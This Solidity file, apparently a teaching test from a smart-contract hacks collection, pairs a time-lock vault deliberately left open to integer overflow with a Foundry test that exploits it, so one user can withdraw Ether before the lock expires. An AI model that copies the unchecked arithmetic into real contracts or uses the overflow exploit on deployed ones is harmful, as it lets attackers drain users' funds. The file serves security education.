// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";



// https://solidity-by-example.org/hacks/overflow/

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Alice and bob both have 1 Ether balance
2. Deploy TimeLock Contract
3. Alice and bob both deposit 1 Ether to TimeLock, they need to wait 1 week to unlock Ether
4. Bob caused an overflow on his lockTime
5, Alice can't withdraw 1 Ether, because the lock time not expired.
6. Bob can withdraw 1 Ether, because the lockTime is overflow to 0
What happened?
Attack caused the TimeLock.lockTime to overflow,
and was able to withdraw before the 1 week waiting period.
*/

contract TimeLock {
    // using SafeMath for uint256;

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
        // lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease); 
    }

    function withdraw() public  {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract ContractTest is Test {
    TimeLock public TimeLockContract;
    address alice; // EOA account
    address bob;
    function setUp() public {
        TimeLockContract = new TimeLock();
         //alice = vm.addr(1);
        alice= makeAddr("alice");
         //bob = vm.addr(2);
        bob = makeAddr("bob");
        vm.deal(alice, 1 ether);   
        vm.deal(bob, 1 ether);
    }    
           
    function testFailOverflow() public {
        // console.log("Alice balance", alice.balance);
        emit log_named_decimal_uint("Alice balance", alice.balance, 18);
        // console.log("Bob balance", bob.balance);
        emit log_named_decimal_uint("Bob balance", bob.balance, 18);

        console.log("Alice deposit 1 Ether...");
        vm.prank(alice);
        TimeLockContract.deposit{value: 1 ether}();
        emit log_named_decimal_uint("Alice balance", alice.balance, 18);
        // console.log("Alice balance", alice.balance);

        console.log("Bob deposit 1 Ether...");
        vm.startPrank(bob); 
        TimeLockContract.deposit{value: 1 ether}();
        emit log_named_decimal_uint("Bob balance", bob.balance, 18);
        // console.log("Bob balance", bob.balance);

        // exploit here
        // bob locktime = t
        // overflow == type(uint).max + 1 
        // t + x = type(uint).max + 1 
        // x = type(uint).max + 1 - t
        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );

        console.log("Bob will successfully to withdraw, because the lock time is overflowed");
        TimeLockContract.withdraw();
        // console.log("Bob balance", bob.balance);
        emit log_named_decimal_uint("Bob balance", bob.balance, 18);
        vm.stopPrank();

        vm.prank(alice);
        console.log("Alice will fail to withdraw, because the lock time not expired");
        TimeLockContract.withdraw();    // expect revert
    }
}
